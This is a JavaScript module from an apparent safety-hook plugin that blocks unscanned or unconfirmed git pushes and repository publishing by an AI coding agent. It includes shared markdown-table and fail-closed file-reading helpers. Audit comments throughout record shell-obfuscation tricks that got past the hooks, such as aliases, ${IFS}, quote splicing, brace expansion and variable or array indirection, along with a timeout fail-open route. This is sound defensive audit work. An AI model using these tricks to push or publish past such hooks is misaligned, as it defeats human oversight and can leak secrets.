// exactly the same command set: a push-capable command cannot slip past one
// while still being caught by the other. If we cannot POSITIVELY prove the
// command is NON-push, treat it as push.
//
// 2026-07-10 gold-standard audit finding (MAJOR, fixed here): the original
// matcher only pattern-matched literal "push"/"gh" text, so `git -c
// alias.p=push p` (a one-line git alias) defeated it completely — the
// literal substring "push" never appears with the required whitespace
// before it. Also, indirection (a project's own deploy.sh / Makefile /
// `npm run release` that itself runs `git push`) is invoked via a Bash
// command containing neither word. Changes here close the two Round-1
// proof-of-concept bypasses (alias definition, script/Makefile/npm-run
// indirection) plus `git send-pack` and `gh alias set` (Round 2 additions).
//
// Disclosed, NOT fully closed (see SECURITY.md): because each hook call
// judges one command string in isolation with no persistent state, an
// alias DEFINED in an earlier command (or in the user's pre-existing global
// gitconfig, never touched by this plugin at all) can still be REUSED later
// by bare name (`git p`) without the word "push" appearing in that later
// command. Catching that would require a state store or inspecting
// `.git/config` on every command, which this hook design doesn't do.
// 2026-07-11 v2.0.0 follow-up audit fix (MAJOR): an adversarial pass found
// that bash resolves `git${IFS}push` (IFS-based word-splitting) and
// `git pu""sh` / `git pu''sh` (empty-string quote splicing) to a real
// `git push` — but the matcher only ever sees the UN-expanded literal text,
// so both returned false (non-push), skipping the secret scan and the
// publish gate entirely. Neither is a variant of the quote-tolerance fix
// above (that handles a whole token wrapped in quotes, not mid-word
// splicing or a shell variable expanding to whitespace). Fix: canonicalise
// the two concrete techniques found — strip empty adjacent quote pairs, and
// replace `$IFS`/`${IFS}` with a literal space — before running every check
// below. This closes the two proof-of-concept bypasses; it does NOT close
// shell obfuscation in general, which has effectively unlimited variations
// (see SECURITY.md's disclosed-limitations section, extended for this).
// 2026-07-11 Round 2 follow-up: adversarial re-testing found the first pass
// only stripped EMPTY adjacent quote pairs, missing the more general (and
// equally trivial) case of quoting real characters mid-word — `git
// p"u"s"h"` splices to a real `push` in bash the same way `pu""sh` does,
// just with non-empty quoted segments — plus backslash-escaped mid-word
// characters (`p\ush`) and backslash-newline line continuations. Now
// stripped generally: repeatedly remove any quote character touching a
// word character on either side (a fixed-point loop, so cascading splices
// like `p"u"s"h"` fully resolve, not just the first pair), remove
// backslash-newline continuations, and un-escape a backslash before an
// ordinary word character. Still not a full shell parser — command
// substitution and variable-reuse-based obfuscation remain open, disclosed
// limitations (see SECURITY.md).
//
// 2026-07-11 Round 4 adversarial-audit fix: the Round 2 version stripped a
// quote whenever a word character touched EITHER side of it, with no check
// on the OTHER side — so the closing quote of a perfectly normal, properly
// paired quoted argument (`"My Project"`, `"/some/path/confirm-publish.mjs"`)
// also got stripped, because it sits right after a word character (the
// last letter of the argument) even though what follows the quote is
// whitespace or end-of-string, not another word character. That corrupted
// legitimate quoted paths containing a space, which then failed
// isConfirmScriptOnly()'s exact-match regex and fell through to the
// generic script/keyword heuristic below — misclassifying a genuine
// confirm-publish.mjs invocation with a spaced project-root argument as
// push-capable, recreating the bootstrap deadlock for that specific input.
// Fixed by only stripping a quote when word characters (or another quote,
// so chained splices still resolve) sit on BOTH immediate sides — the
// actual signature of mid-word splicing — never when the quote is at a
// genuine token boundary (next to whitespace, start, or end of string).
// 2026-07-11 Round 5 audit fix: exported so gate.mjs's isGoPublicCommand()
// can share the exact same canonicalisation isPushCapable() uses, instead
// of matching raw, unnormalized command text (see that function for what
// this closed).
//
// 2026-07-12 audit fix (CRITICAL, found by execution): every trailing
// boundary below (`([ \t]|$)`, `([ \t]|=|$)`) required the matched keyword
// to be followed by a literal space/tab or the true end of the string. But
// real bash commands are just as often followed by `;`, `|`, `&`, `)`, `<`,
// `>`, a backtick, or a trailing newline — none of which satisfy those
// anchors — so `git push;`, `git push|cat`, `git push\n`, `git send-pack;`,
// and the go-public `--public;` all failed to match and were misclassified
// as non-push, bypassing the secret scan and both confirmation gates
// entirely. Reproduced live end-to-end: with a real secret committed and
// zero confirmation tokens recorded, `git push;` was `allow`ed by both
// scan.mjs and gate.mjs while plain `git push` was correctly denied.
// `LEXICAL_BOUNDARY` is shared by every regex below (and by gate.mjs's
// isGoPublicCommand) that previously ended in one of those two anchors: a
// negative lookahead for an identifier character treats any of ';|&)<>`\n'
// or end-of-string as a valid boundary, while still rejecting a keyword
// that's actually part of a longer word (`pushx`, `--publicity`).
// 2026-07-21 Round 6 (red-team) fix: split a markdown table ROW into cells on
// UNESCAPED pipes only, then unescape any GFM `\|` to a literal pipe. Naive
// `line.split('|')` mis-columns any cell containing a pipe (raw, or the
// GFM-correct `\|`), which in the index-based table parsers silently shifted the
// Status/Where column and skipped the row entirely — a false-clean in
// verify-progress and memory-integrity. Shared so every table-parsing hook splits
// identically. Leading/trailing empty cells are preserved, exactly like split('|').
// ---- shared fail-closed read (2026-08-13, finding X12) -----------------------
// Five separate gates had the same defect: a single `read()` returning null for
// BOTH "the file isn't there" and "the file is there but I couldn't read it",
// with the caller treating null as "nothing to check" and exiting 0. So an
// unreadable INDEX.md, a directory where REQUIREMENTS.md should be, or a
// half-written file on a full disk silently passed the very gate meant to
// guarantee it. Reproduced by execution on memory-integrity.mjs (twice) and
// traceability-check.mjs — see test/repro/phase1-gate-honesty.mjs cases P6-P8.
//
// content-check.mjs already had the correct shape and documented the principle:
// "A gate that cannot read its input must never claim its input is fine." Rather
// than fix the same bug five times and invite a sixth, that shape is promoted
// here and every gate uses it.
//
// ENOENT is genuine absence and returns the MISSING sentinel, which a caller may
// legitimately treat as "not applicable". Every other error throws, and each
// gate's own handler turns that into a BLOCKING, explained problem.
export const MISSING = Symbol('missing');
export function readOrBlock(p) {
  try {
    return stripBom(fs.readFileSync(p, 'utf8'));
  } catch (e) {
    if (e && e.code === 'ENOENT') return MISSING;
    throw e; // never swallowed: an unreadable input is a block, not a pass
  }
}

// ---- shared markdown table parser (2026-08-13, findings X2, X10) -------------
// Four gates each had their own table reader, gated on `/^\s*\|/`, and each read
// only the FIRST table it found. Two consequences, both reproduced:
//
//   * quality-gate.mjs and content-check.mjs ignored every later table. A project
//     that appends its current phase's Definition of Done below the finished one
//     — which its own append-never-rewrite discipline encourages — got a green
//     light while the live table said its tests were failing. That is the worst
//     class of defect here, because nobody re-checks a passing gate.
//   * a pipe-less GFM table (outer pipes omitted, valid markdown that renders
//     identically on GitHub) was not seen at all, so four gates reported "no
//     table found" about a file that plainly had one.
//
// verify-progress.mjs already had the strongest reader — it handles pipe-less
// tables and fails closed on a row whose column count disagrees with its header,
// which is what catches a raw pipe inside a cell shifting every later column.
// That reader is promoted here verbatim in behaviour, and returns EVERY table.
//
// 2026-08-13, independent-review finding F12 — scope corrected. Two gates use this
// helper today: quality-gate.mjs and content-check.mjs. verify-progress.mjs still
// carries the original it was promoted FROM, because its reader also computes a
// status-column index and tracks which lines a table consumed; migrating it is a
// separate, riskier change than this one, and doing it badly would put the sole
// mechanical enforcer of "done means proven" at risk. memory-integrity.mjs and
// traceability-check.mjs still require a leading pipe, so a pipe-less table is
// unreadable to them — they fail CLOSED on it, so it is a false block rather than a
// false pass, but it is not fixed. Both are recorded as follow-on work rather than
// claimed as done here.
//
// Returns: [{ headerCells, rows: [{ raw, cells, ragged }] }]
//   ragged === true means the row's column count disagrees with the header, in EITHER direction.
//   Prefer `overlong` (a literal pipe shifted the values — untrustworthy) or `short` (legal GFM, a
//   trailing column is merely absent) when wording a message; see the note at the push site. So
//   its cells cannot be trusted positionally. A caller must fail closed on a
//   ragged row that makes any claim, never skip it silently.
export function parseTables(text) {
  const lines = String(text).split(/\r?\n/);
  // 2026-08-15, the shared-table-reader build (traceability-check D3, and the same shape
  // found in content-check). A fenced block is documentation, not data: a `​```markdown`
  // example of "what a row looks like" was read as a live table, and in traceability-check
  // it was taken as THE requirements matrix — so the real matrix below it went unread and
  // its defects unexamined.
  //
  // Fenced lines are blanked rather than removed, so every index this function reports
  // (headerLine, and any line number a caller derives from it) still refers to the real
  // line in the real file. Silently renumbering a file's lines would be a worse defect
  // than the one being fixed.
  const inFence = new Array(lines.length).fill(false);
  {
    let fence = null; // the opening delimiter, so ``` does not close ~~~ or a longer run
    for (let i = 0; i < lines.length; i++) {
      const m = /^\s*(`{3,}|~{3,})/.exec(lines[i]);
      if (fence === null) {
        if (m) {
          fence = m[1][0].repeat(3);
          inFence[i] = true;
        }
      } else {
        inFence[i] = true;
        if (m && m[1][0].repeat(3) === fence) fence = null;
      }
    }
    // An unterminated fence would otherwise swallow the rest of the file. A file that ends
    // mid-fence is malformed, and treating everything after it as documentation would hide
    // real tables — so the run is abandoned rather than trusted.
    if (fence !== null) inFence.fill(false);
  }
  for (let i = 0; i < lines.length; i++) if (inFence[i]) lines[i] = '';
  const normCells = (line) => {
    const cells = splitPipeCells(line).map((c) => c.trim());
    const t = line.trim();
    if (t.startsWith('|')) cells.shift();
    if (t.endsWith('|') && cells.length) cells.pop();
    return cells;
  };
  const hasPipe = (l) => l.trim() !== '' && l.includes('|');
  const tables = [];
  for (let i = 0; i < lines.length; i++) {
    const header = lines[i];
    const next = i + 1 < lines.length ? lines[i + 1] : '';
    const isHeader =
      header.trim() !== '' &&
      header.includes('|') &&
      !SEPARATOR_ROW_RE.test(header) &&
      (SEPARATOR_ROW_RE.test(next) || /^\s*\|/.test(header));
    if (!isHeader) continue;
    const headerCells = normCells(header);
    // 2026-08-13, independent-review finding F6 (reproduced). A table's rows must
    // be recognised in the SAME style as its header. The first version of this
    // helper ended a table only at a blank or pipe-less line, which was safe in
    // verify-progress.mjs (where a ragged row mattered only if it claimed "done")
    // but not in quality-gate.mjs or content-check.mjs, where a ragged row is now
    // a hard block. Consequence: an ordinary prose line immediately after a piped
    // table — "Notes: filtered with `grep -v warn | head -20`." — was read as a
    // malformed ROW and blocked the gate, with advice ("write it as \|") that was
    // simply wrong, because the line was never a table row at all.
    //
    // A piped table therefore only continues through lines that are themselves
    // piped; a pipe-less table keeps the looser rule, because that is the only
    // thing that identifies its rows.
    const pipeLed = /^\s*\|/.test(header);
    const looksLikeRow = (l) => (pipeLed ? /^\s*\|/.test(l) : hasPipe(l));
    const rows = [];
    let j = i + 1;
    for (; j < lines.length; j++) {
      const row = lines[j];
      if (!looksLikeRow(row)) break; // this line is not part of THIS table
      if (SEPARATOR_ROW_RE.test(row)) continue; // the `| :-- | :-- |` divider
      const cells = normCells(row);
      // 2026-08-22, X201: `ragged` alone conflates two opposite problems, and every consumer
      // reported the wrong one for half its inputs.
      //
      //   overlong (cells > header) — usually a literal `|` inside a cell. The values really are
      //     shifted, so "escape it as \|" is correct advice and the row cannot be trusted.
      //   short (cells < header)    — LEGAL GitHub-flavoured markdown. GFM fills the missing
      //     trailing cells as empty. Nothing is shifted; a trailing column is simply absent. Telling
      //     the user to escape a pipe that is not there sends them looking for a defect that does
      //     not exist, in a message that blocks their Publish.
      //
      // `ragged` keeps its exact old meaning so no consumer's BEHAVIOUR changes by accident; the two
      // new flags let each one say the true thing. Reproduced on this project's own golden fixture:
      // deleting one trailing cell from an INDEX.md row blocked memory-integrity, and the same
      // deletion in PROGRESS.md blocked three gates at once, each with a different wrong explanation.
      rows.push({
        raw: row,
        cells,
        ragged: cells.length !== headerCells.length,
        overlong: cells.length > headerCells.length,
        short: cells.length < headerCells.length,
      });
    }
    // headerLine lets a caller inspect the lines ABOVE a table — needed for
    // quality-gate.mjs's explicit opt-out marker (finding F1).
    tables.push({ headerCells, rows, headerLine: i });
    i = j - 1; // resume after this table, so its rows are not re-read as headers
  }
  return tables;
}

export function splitPipeCells(line) {
  return line.split(/(?<!\\)\|/).map((cell) => cell.replace(/\\\|/g, '|'));
}

// 2026-07-26 further-pass audit fix. verify-progress.mjs's Round 11 fix strips
// surrounding markdown emphasis (**bold**, __bold__, *italic*, _italic_,
// `code`) from a header cell before testing it against a column-name pattern,
// so "**Status**"/"`State`" still match. quality-gate.mjs's and
// traceability-check.mjs's own header matchers never picked up that same
// fix — three files doing the same job, one had it and the other two
// didn't. Reproduced by execution: a Definition-of-Done table with header
// `**Status**` made quality-gate.mjs report the whole table unrecognised and
// every required dimension "missing", even though every row was otherwise
// correctly filled in. Fails toward BLOCKING (the safe direction — a
// dimension not being blocked is the danger, not a false block), but it's a
// real usability gap and the exact divergence a background review agent was
// asked to hunt for. Moved here so all three share it.
// 2026-07-31 maintenance fix: closing an evasion route in every gate that
// runs PLACEHOLDER_RE against a deEmphasise()'d cell. The whitespace/*/_/`
// stripping above only ever covered THREE of the markdown/HTML forms a real
// evidence/status cell can be decorated with — a placeholder disguised as
// strikethrough (`~~tbd~~`), an HTML bold/strong tag (`<b>tbd</b>`,
// `<strong>tbd</strong>`), or wrapped in a matching pair of quotes
// (`"tbd"`, curly `"tbd"` too) still reached PLACEHOLDER_RE completely
// intact and evaded every one of quality-gate.mjs, content-check.mjs,
// traceability-check.mjs and memory-integrity.mjs. Reproduced live before
// fixing: all three forms passed PLACEHOLDER_RE.test(deEmphasise(x)) as
// `false` (should be `true`), while the existing */_/` cases were correctly
// `true` throughout.
//
// Each new form is stripped ONLY when it wraps the WHOLE remaining string
// (anchored at both ends, exactly like the existing */_/` handling) — never
// when it merely appears somewhere inside a longer sentence. That anchoring
// is what keeps ordinary prose safe: a real evidence cell reading `The user
// said "it works" during review` starts with a plain letter, not a quote,
// so the quote-strip never fires and the sentence passes through unchanged.
// An HTML tag pair only strips when the closing tag name matches the
// opening one (case-insensitively, via backreference) and wraps the whole
// string, so unrelated `<b>` text next to other content is left alone.
//
// Bounded loop (not open-ended, not a general nested-markup parser): a
// realistic cell combines at most one or two of these decorations (e.g. a
// quoted strikethrough `"~~tbd~~"` needs the quotes stripped, THEN the
// strikethrough, before the plain tbd is left). Five passes is generous
// headroom for that, stopping as soon as a pass makes no further change —
// it is not trying to solve arbitrary nesting, which these four gates never
// realistically see.
//
// 2026-07-31 further-pass maintenance fix (F7, independent reviewer
// finding): the three paired-delimiter patterns (strikethrough, HTML
// bold/strong tag, straight quotes) originally captured their inner content
// with the greedy, dot-matches-everything `[\s\S]*`. The outer `^...$`
// anchors DO stop this from mangling a cell where the decorated span isn't
// the last thing before the end of the string (verified: `<b>README</b> and
// <b>CONTRIBUTING</b> updated` does not match at all, and is left alone,
// because the string does not end immediately after a closing `</b>`) — but
// a cell that combines TWO separately decorated spans and legitimately ENDS
// right after the second closing delimiter, e.g. `<b>README</b> and
// <b>CONTRIBUTING</b>` or `~~a~~ and ~~b~~` or `"a" and "b"`, still matched
// as ONE span: the greedy inner group walked past the first span's own
// closing delimiter and swallowed everything up to the LAST one, so
// `<b>README</b> and <b>CONTRIBUTING</b>` came out as the mangled
// `README</b> and <b>CONTRIBUTING` — decoration half-stripped, tags left
// dangling in the middle of ordinary text.
//
// Fixed by excluding the delimiter's own character from the inner capture
// (`[^<]*` for the HTML-tag case, `[^~]*` for strikethrough, `[^"]*` /
// `[^”]*` for the two quote forms) instead of allowing it to match anything.
// This does not change any single-decoration case (the four already-required
// forms — `~~tbd~~`, `<b>tbd</b>`, `<strong>tbd</strong>`, `"tbd"` — contain
// no instance of their own delimiter inside the decorated text, so nothing
// changes for them). For a genuine multi-span cell it instead makes the whole
// pattern FAIL to match — because the excluded character appears before the
// real closing delimiter is reached — which correctly leaves the cell
// untouched rather than corrupting it; deEmphasise's job is to strip
// decoration it can safely and unambiguously identify, not to guess at
// nested/repeated markup.
export function deEmphasise(c) {
  let s = String(c);
  for (let i = 0; i < 5; i++) {
    const before = s;
    s = s
      .replace(/^[\s*_`]+/, '')
      .replace(/[\s*_`]+$/, '')
      .replace(/^~~([^~]*)~~$/, '$1')
      .replace(/^<(b|strong)>([^<]*)<\/\1>$/i, '$2')
      .replace(/^"([^"]*)"$/, '$1')
      .replace(/^“([^”]*)”$/, '$1');
    if (s === before) break;
  }
  return s;
}

export const LEXICAL_BOUNDARY = '(?![A-Za-z0-9_])';

// 2026-08-23, X272. Hoisted to module scope from inside isPushCapable, where it was a local, so the
// narrow consent predicate below and the wide classifier share ONE definition. A hyphen CONTINUES a
// program name, so `git-push-helper` is a different program from `git-push` — the distinction X179's
// controls exist to protect. Two hand-maintained copies of a regex constant is how this project's
// SEPARATOR_ROW_RE drifted out of sync with its siblings; one definition cannot drift.
export const DASHED_BOUNDARY = '(?![A-Za-z0-9_-])';
// ---- bounded assignment resolution (2026-08-07 audit fix) --------------------
// The scalar-assignment resolution below is superlinear in the NUMBER of
// assignments in one command: each new assignment is re-resolved against every
// assignment already known, so cost grows roughly quadratically. Measured on
// this machine, one fresh process per point: 2,000 assignments = 1.5s, 4,000 =
// 6.7s, 6,000 = 17.0s, 8,000 = 29.1s. A real command has fewer than 30 and
// costs 0.1-0.6 ms.
//
// SECURITY.md disclosed this as an accepted, adversarial-only cost, and left
// one question open: what Claude Code does with a `command` hook that exceeds
// its timeout. That question is now answered from the hooks reference, and the
// answer is what makes this worth bounding rather than merely disclosing:
//
//   - "Any other exit code is a non-blocking error for most hook events. The
//     action proceeds." A hook cancelled at its timeout exits non-zero.
//   - The reference singles out Agent SDK callback hooks as the exception that
//     BLOCKS on timeout, "because a callback there can be acting as a policy
//     gate that must not fail open" — wording that only makes sense if the
//     ordinary command-hook path does fail open.
//
// So a command crafted to run this resolution past the 600 s default timeout
// would have BOTH push-time hooks cancelled as non-blocking errors and the push
// would proceed unscanned and unauthorised. Extrapolating the curve above, that
// needs on the order of 36,000 assignments (~310 KiB of command text).
//
// Stated honestly: the fail-open behaviour is read from the documentation, not
// reproduced in a live session here. The bound is worth adding either way — if
// it fails open this closes a real bypass, and if it fails closed it still
// removes a multi-minute stall on every such command. This is the same reasoning
// the 2026-07-21 ReDoS fix in isPushCapable already recorded ("a pathological
// input could push the hook past the harness timeout"), applied to the cost this
// file had disclosed rather than bounded.
//
// The bound is 500 — more than 16x the largest real command this project has
// ever seen (<30) and far below the count needed to matter. Past it, resolution
// is skipped entirely and the two security callers fail CLOSED (see
// isPushCapable below and isGoPublicCommand in gate.mjs): a command this
// pathological is never legitimate, so treating it as push-capable and as
// visibility-changing costs a real user nothing.
export const MAX_RESOLVED_ASSIGNMENTS = 500;
export function exceedsAssignmentBound(c) {
  if (!c) return false;
  // Deliberately a cheap, single linear pass — counting must never itself be
  // the expensive thing it exists to prevent. Every match consumes at least the
  // `=`, so this cannot spin on a zero-length match.
  const re =
    /(?:^|[;\n]|&&)\s*(?:export|local|readonly|declare|typeset)?\s*[A-Za-z_][A-Za-z0-9_]*\+?=/g;
  let count = 0;
  while (re.exec(c) !== null) {
    if (++count > MAX_RESOLVED_ASSIGNMENTS) return true;
  }
  return false;
}

export function normalizeForPushCheck(c) {
  // Past the bound, skip resolution altogether and hand back the raw text. Both
  // security callers check the same bound and fail closed, so returning
  // unresolved text here can never turn into a permissive answer.
  if (exceedsAssignmentBound(c)) return c;
  let n = c;
  // 2026-07-12 Round 7 audit fix (CRITICAL, found by execution): bash's
  // array assignment (`arr=(a b)`) and subscript access (`${arr[N]}`, bare
  // `$arr`/`${arr}` for element 0, `${arr[@]}`/`${arr[*]}` for all elements
  // space-joined) is a wholly different construct from the scalar `VAR=
  // value` case resolved further below — it was left completely
  // unmodelled, so `arr=(pull push); git "${arr[1]}" origin main` left
  // `${arr[1]}` as opaque, unresolved text. Confirmed live via real bash
  // (`arr=(pull push); echo "${arr[1]}"` -> `push`) and via the real
  // isPushCapable(): it returned false for that exact command — the same
  // complete, both-gates bypass as the printf -v case below. The
  // go-public analogue (`arr=(private public); gh repo edit me/app
  // --visibility=${arr[1]}`) defeated isGoPublicCommand the same way.
  // Deliberately narrow, matching this file's established pattern: only a
  // literal `NAME=( ... )` assignment with whitespace-separated (optionally
  // quoted) elements is modelled — no post-assignment element writes
  // (`arr[1]=x`), no `+=` append, no associative (`declare -A`) arrays,
  // and no evaluation of a command substitution embedded in an element.
  // Those remain a disclosed residual limitation (see
  // SECURITY.md), the same shape as this file's other already-disclosed,
  // deliberately-not-fully-modelled shell constructs, not a newly-
  // introduced one — confirmed with the user before drawing this line,
  // after four consecutive rounds kept finding narrower and narrower array
  // constructs, the same open-ended shape this file already declines to
  // fully solve for scalar command substitution.
  // 2026-07-12 Round 8 audit fix (real gap, found by a re-attack pass,
  // then independently reproduced live before fixing): bash's array
  // COMPOUND assignment `NAME=(word1 word2 ...)` is documented to run
  // brace expansion (among other expansions) on each word INSIDE the
  // parens, regardless of any declaration keyword — a materially
  // different rule from the plain scalar case below, where a bareword
  // value is NOT brace-expanded unless a keyword makes it a real command
  // argument. `arr=({pull,push})` genuinely produces a real TWO-element
  // array (`pull`, `push`), confirmed live (`arr=({pull,push}); echo
  // "${arr[1]}"` -> `push`), which the original element-splitting here
  // (a plain whitespace split with no brace handling at all) left as one
  // opaque, un-expanded element, and `git "${arr[1]}" origin main` was
  // left unresolved.
  function expandBraceListToElements(tok) {
    let t = tok.replace(/\{([A-Za-z0-9]+)\.\.\1\}/g, '$1'); // degenerate {X..X} -> X
    const m = t.match(/\{([^{}]*,[^{}]*)\}/);
    if (!m) return [t];
    const prefix = t.slice(0, m.index);
    const suffix = t.slice(m.index + m[0].length);
    return m[1].split(',').map((part) => prefix + part + suffix);
  }
  // 2026-07-12 Round 9 audit fix (real gap, found by a re-attack pass, then
  // independently reproduced live before fixing): array-element token
  // extraction only ever stripped a quote character sitting at the
  // absolute start/end of a token (`/^["']|["']$/`) — a much weaker path
  // than the scalar value pipeline, which decodes ANSI-C `$'...'` quoting
  // (including its hex/octal escapes) explicitly. `arr=($'pu\x73h')`
  // genuinely decodes to the array element `push` in real bash (confirmed
  // live), but the naive quote-strip here left a corrupted, unterminated
  // `$'pu\x73h` behind (it stripped the trailing `'` but the leading `$`
  // isn't a quote char, so it wasn't recognised as the ANSI-C wrapper at
  // all), which the later whole-string ANSI-C pass then couldn't match
  // either (its regex requires a matching closing quote). Fixed by
  // decoding ANSI-C tokens INSIDE each array element first, using the same
  // decode logic the main whole-string pass further below now also calls
  // (extracted into this shared function so the two paths cannot drift
  // apart from each other again).
  // 2026-07-12 Round 14 audit fix: extended to also decode the common
  // ANSI-C letter-escapes (`\n`, `\t`, `\r`, `\\`, `\'`) — previously only
  // `\xHH` hex and octal escapes were decoded here. Needed so a real
  // embedded newline inside a `$'...'`-quoted value (e.g. `mapfile -t arr
  // <<< $'pull\npush'`) is recognised as a genuine line break rather than
  // staying literal backslash-n text, which is what `mapfile`'s
  // one-element-per-line splitting depends on.
  const ANSI_C_ESCAPES = {
    n: '\n',
    t: '\t',
    r: '\r',
    '\\': '\\',
    "'": "'",
    a: '\x07',
    b: '\b',
    f: '\f',
    v: '\v',
    e: '\x1b',
  };
  function decodeAnsiCTokens(text) {
    return text.replace(/\$'((?:\\.|[^'\\])*)'/g, (_m, inner) =>
      inner
        .replace(/\\x([0-9A-Fa-f]{1,2})/g, (_h, hex) => String.fromCharCode(parseInt(hex, 16)))
        .replace(/\\([0-7]{1,3})/g, (_o, oct) => String.fromCharCode(parseInt(oct, 8)))
        .replace(/\\([ntr\\'abfve])/g, (_l, ch) => ANSI_C_ESCAPES[ch]),
    );
  }
  const arrayAssignRe =
    /(?:^|[;\n]|&&)\s*(?:export\s+|local\s+|readonly\s+|declare\s+(?:-a\s+)?|typeset\s+(?:-a\s+)?)?([A-Za-z_][A-Za-z0-9_]*)=\(([^)]*)\)/g;
  const knownArrays = new Map();
  for (const am of n.matchAll(arrayAssignRe)) {
    const name = am[1];
    const raw = am[2].trim();
    const tokens =
      raw.length === 0
        ? []
        : raw.split(/\s+/).map((e) => decodeAnsiCTokens(e).replace(/^["']|["']$/g, ''));
    const elems = tokens.flatMap(expandBraceListToElements);
    knownArrays.set(name, elems);
  }
  // 2026-07-12 Round 10 audit fix (real gap, found by a systematic
  // completeness sweep, then independently reproduced live before fixing):
  // `${#arr[@]}`/`${#arr[*]}` (bash's array-length syntax) used as a scalar
  // assignment's value — then that scalar used inside a later subscript —
  // resolves to a real element in bash (`i=${#arr[@]}; i=$((i-1));
  // ${arr[$i]}` -> the array's last element) but was left completely
  // unmodelled: nothing recognised the `${#name[@]}` form at all, so the
  // assigned scalar kept the literal, unresolved text. Substituted
  // textually HERE, before the scalar assignment step below runs (moved
  // the whole array-parsing block earlier in the function specifically so
  // this ordering is possible), so the existing transitive-chain machinery
  // picks up the resolved number the same way it already handles any other
  // literal value.
  n = n.replace(/\$\{#([A-Za-z_][A-Za-z0-9_]*)\[[@*]\]\}/g, (m, name) =>
    knownArrays.has(name) ? String(knownArrays.get(name).length) : m,
  );
  // 2026-07-12 Round 3 audit fix (CRITICAL, found by adversarial combination
  // testing, then independently reproduced live before fixing): bash brace
  // expansion turns `{git,push}` into the two separate words `git push`
  // BEFORE the command line is even parsed — confirmed live (`bash -c
  // 'echo {git,push} origin main'` -> `git push origin main`) — but nothing
  // here recognised the `{a,b}` form at all, so `{git,push} origin main`
  // (and stacked with case-variance, a trailing terminator, quote-splicing,
  // or ANSI-C quoting) bypassed every keyword regex below, since none of
  // them ever expected a comma where whitespace should be. This is a
  // distinct technique from every prior fix in this file (IFS-splitting,
  // quote-splicing, backslash-escapes, ANSI-C quoting all target something
  // OTHER than the source text's inter-token separator) and defeated BOTH
  // the push gate and the go-public gate simultaneously with zero
  // confirmation tokens — reproduced end-to-end via the real gate.mjs, and
  // separately confirmed live against this very session's own active hook
  // chain. Runs before the ANSI-C step below (2026-07-12 Round 5 comment
  // fix: this originally said brace expansion "runs first," matching
  // bash's real evaluation order — but the Round 4 variable-substitution
  // step immediately below was inserted ABOVE this line, so the actual
  // code order is now variable-substitution, then brace, then ANSI-C —
  // the reverse of bash's own brace-then-variable order. Re-verified this
  // round that the divergence is safe, not exploitable: every case where
  // the two orders would give a different answer requires brace expansion
  // to synthesise a `$VAR` reference that doesn't appear in the source
  // text at all, which fails CLOSED — misclassified as MORE push-capable,
  // never less — so this comment is corrected for accuracy, not because
  // the order needed to change).
  // 2026-07-12 Round 4 re-verification fix (CRITICAL, found by execution,
  // then a second real bug found while fixing the first): a fresh
  // adversarial pass found that the Round 3 line above excluded any brace
  // group containing a `$`, reasoned as needed "so `${IFS}`-style parameter
  // expansions are left alone" — that reasoning was simply wrong: `${IFS}`
  // contains no comma, so it was never going to match this comma-requiring
  // regex regardless of the `$` exclusion; the exclusion protected against
  // nothing while creating a real gap. First fix attempt: removed the `$`
  // exclusion so the comma-list is split regardless of `$` content — this
  // alone did NOT close the bypass (verified: still failed after that
  // change), because the disguised alternative itself (`gi$t`) still isn't
  // literally "git" once split out; splitting alone doesn't resolve what
  // `$t` means. Real bash's actual PoC — `t=t; {gi$t,push} origin main` —
  // assigns the variable in the SAME command string, then relies on it:
  // confirmed live via real bash (`t=t; set -- {gi$t,push} origin main;
  // echo "$@"` -> `git push origin main`). Second, complete fix: a
  // narrow, bounded variable-substitution step (below) that resolves ONLY
  // a simple `VAR=value` assignment made earlier in the SAME command
  // string, then substitutes later `$VAR`/`${VAR}` references with that
  // literal value — deliberately NOT a general shell-variable interpreter
  // (no export/arrays/command-substitution/quoting-in-value support), the
  // same "closes the concrete case, not shell obfuscation in general"
  // pattern already used throughout this function; a variable whose value
  // isn't resolvable this way (e.g. set in an earlier, separate Bash call,
  // or from the environment) remains a disclosed residual limitation, the
  // same shape as the already-disclosed git-alias-reuse gap in SECURITY.md
  // (this hook has no persistent state across commands). Reproduced
  // end-to-end before fixing: with a real secret committed and zero
  // confirmation tokens, `t=t; {gi$t,push} origin main` was allowed by
  // both `scan.mjs` and `gate.mjs`; the go-public analogue (`h=h;
  // {g$h,repo,edit} me/app --public`) defeated both gates the same way.
  // Also disclosed, not fully closed (re-confirmed this round): nested
  // braces (`{g{i,y}t,push}`) and prefix/suffix concatenation forms
  // (`p{ush,ost}`, `git{,-push}`) are a detection gap but NOT a live
  // working bypass — real bash's own Cartesian-product semantics corrupt
  // the resulting command's actual target/subcommand in both cases (e.g.
  // `git p{ush,ost} origin main` really runs `git push` but with "post"
  // substituted as the destination, so nothing actually reaches `origin`).
  // 2026-07-12 Round 5 re-verification fix (CRITICAL x3 + one implementation
  // bug, found by a final adversarial pass, all independently reproduced
  // live before fixing): the Round 4 variable-substitution step above had
  // four real gaps.
  // (1) The assignment anchor required the variable name to start
  // immediately after `^`/`;`/`\n`/`&&` — a leading `export `/`local `/
  // `readonly `/`declare `/`typeset ` keyword (all fully resolvable in the
  // SAME command, unlike the alias-reuse/array/command-substitution cases
  // this step already disclosed as inherently unclosable) sat in between
  // and was never captured, so `export t=t; {gi$t,push}` left `$t`
  // unresolved. Fixed by tolerating an optional declaration keyword.
  // (2) Assignment VALUES were captured once from the untouched original
  // string, so a transitive chain (`a=i; b=$a; {g${b}t,push}`) captured
  // `b`'s value as the literal, unresolved text `$a`, not `a`'s actual
  // value `i`. Fixed by resolving each new assignment's value against
  // already-processed assignments (in left-to-right order, matching how
  // bash itself would resolve a sequential chain) before recording it.
  // (3) The substitution itself was `n.replace(varRe, value)` — passing an
  // attacker-influenced VALUE as a plain string to JS's `String.replace()`
  // is unsafe, because JS treats `$$`, `$&`, `` $` ``, `$'`, and `$1`-`$9`
  // in a STRING replacement argument as special back-reference tokens, not
  // literal text. A value containing any of these (trivially producible in
  // real bash, e.g. `t=$'push'`) corrupted the normalized string in
  // unpredictable ways instead of substituting literally. This is a JS-
  // mechanics defect, not a missing shell-obfuscation case — fixed by using
  // a function replacer (`() => value`), which always substitutes literally
  // regardless of what characters `value` contains.
  // (4) Bash's `{X..Y}` sequence/range syntax (distinct from the comma-list
  // form already handled) has no comma, so the brace-expansion regex below
  // never touched it — but bash also accepts a DEGENERATE single-element
  // range where both ends are identical (`{s..s}` -> just `s`), letting a
  // single character hide behind range syntax purely to dodge the comma
  // requirement: confirmed live, `git pu{s..s}h origin main` -> real bash
  // `git push origin main`. Fixed by expanding only this narrow, safe
